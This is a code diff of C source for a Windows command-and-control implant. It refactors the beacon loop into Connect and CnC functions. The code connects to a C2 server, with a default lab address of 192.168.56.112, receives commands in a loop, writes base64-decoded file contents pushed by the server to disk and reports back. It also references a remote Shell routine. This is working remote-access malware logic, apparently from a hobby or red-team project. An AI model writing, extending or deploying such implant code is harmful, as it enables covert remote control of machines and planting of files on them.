@@ -286,40 +286,7 @@ void Shell(char* C2Server, int C2Port)
 }
 /* #endregion */
 
-/* #region Beacon logics */
-void StartBeacon(char* C2Server, int C2Port)
-{
-	SOCKET tcpsock;
-	sockaddr_in addr;
-	WSADATA wsversion;
-	// WSADATA object - contains details of application state regarding to network
-
-	// Version comparison - whether compiled version of sockets is compatible with the older versions
-	WSAStartup(MAKEWORD(2,2), &wsversion);
-
-	// WSASocket vs socket - same functionality, WSA.. has more options to work with.
-	tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
-
-	addr.sin_family = AF_INET;
-	addr.sin_addr.s_addr = inet_addr(C2Server);
-	addr.sin_port = htons(C2Port);
-
-	int SOCK_STATE;
-	SOCK_STATE = connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr));
-	
-	// This if statement performs connection and triggers if connection to C&C errored out.
-	if (SOCK_STATE==SOCKET_ERROR) {
-		closesocket(tcpsock);
-		WSACleanup();
-		return;
-	}
-	
-	// Else connection successfull..
-	else {
-		
-		// CnC(RecvData,tcpsock);
-		while (true) {
-			
+void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 			/* #region Connection verification */
 			char RecvData[1024] = "";
 			memset(RecvData, 0, sizeof(RecvData));
@@ -347,23 +314,33 @@ void StartBeacon(char* C2Server, int C2Port)
 				char * b64_contents = strtok(NULL, delim);
 				// this needed to trim new line from the end, so base64 can be parsed correctly further
 				b64_contents = strtok(b64_contents,"\n");
+				
 				size_t filesize = b64_decoded_size(b64_contents);
-				char contents[filesize];
-				char * cntptr = contents;
-				cntptr  = b64_decode(b64_contents);
+				char * contents = (char *)malloc(filesize);
+				contents  = b64_decode(b64_contents);
 
-				printf("[beacon] decoded data: %s\n", cntptr);
+				printf("[CnC] decoded data: %s\n", contents);
 
 				// uploading
 				int result;
-				result = upload(filename,cntptr);
+				result = upload(filename,contents);
 
 				// C&C part
 				char buffer[255];
 				memset(buffer, 0, sizeof(buffer));
-				if (result == 0) { strcat(buffer,"\nUploaded "); strcat(buffer,filename); }
+				if (result == 0) { 
+					strcat(buffer,"\nUploaded "); 
+					strcat(buffer,filename); 
+				}
 				// TODO check if this else works correctly!!
-				else { strcat(buffer,"Failed to write file. Errno from fopen: "); strcat(buffer, (char*)result); }
+				else { 
+					printf("[CnC] DBG here"); 
+					strcat(buffer,"Failed to write file. Errno from fopen: "); 
+					char errnos[2];
+					memset(errnos,0,2);
+					_itoa(result,errnos,10);
+					strcat(buffer,errnos);
+				}
 				strcat(buffer,"\n");
 				
 				send(tcpsock,buffer,strlen(buffer)+1,0);
@@ -444,6 +421,40 @@ void StartBeacon(char* C2Server, int C2Port)
 				memset(RecvData, 0, sizeof(RecvData));
 			}
 			memset(RecvData, 0, sizeof(RecvData));
+}
+
+/* #region Beacon logics */
+void Connect(char* C2Server, int C2Port)
+{
+	SOCKET tcpsock;
+	sockaddr_in addr;
+	WSADATA wsversion;
+	// WSADATA object - contains details of application state regarding to network
+
+	// Version comparison - whether compiled version of sockets is compatible with the older versions
+	WSAStartup(MAKEWORD(2,2), &wsversion);
+
+	// WSASocket vs socket - same functionality, WSA.. has more options to work with.
+	tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+	addr.sin_family = AF_INET;
+	addr.sin_addr.s_addr = inet_addr(C2Server);
+	addr.sin_port = htons(C2Port);
+
+	int SOCK_STATE;
+	SOCK_STATE = connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr));
+	
+	// This if statement performs connection and triggers if connection to C&C errored out.
+	if (SOCK_STATE==SOCKET_ERROR) {
+		closesocket(tcpsock);
+		WSACleanup();
+		return;
+	}
+	// Else connection successfull..
+	else {
+		
+		while (true) {
+			CnC(tcpsock,C2Server,C2Port);
 		}
 	}
 	closesocket(tcpsock);
@@ -470,7 +481,7 @@ int main(int argc, char **argv)
 				// NEED TO IMPLEMENT RANDOM DELAY
 				Sleep(1000); // 1000 ms = 1s
 
-				StartBeacon(argv[1],port);
+				Connect(argv[1],port);
 		}
 	} else {
 		char host[] = "192.168.56.112";
@@ -480,7 +491,7 @@ int main(int argc, char **argv)
 				// NEED TO IMPLEMENT RANDOM DELAY
 				Sleep(1000); // 1000 ms = 1s
 
-				StartBeacon(host,port);
+				Connect(host,port);
 		}
 	}
 	return 0;
